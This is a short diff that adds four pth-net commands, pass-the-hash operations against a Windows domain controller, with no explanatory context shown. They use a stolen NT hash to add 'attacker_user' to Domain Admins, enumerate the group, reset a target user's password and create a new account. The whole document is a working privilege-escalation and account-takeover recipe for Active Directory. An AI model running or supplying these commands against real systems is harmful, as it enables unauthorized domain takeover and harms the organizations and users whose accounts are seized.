@@ -1,0 +1,4 @@
+pth-net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
+pth-net rpc group members 'Domain admins' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
+pth-net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
+pth-net rpc user add 'newuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
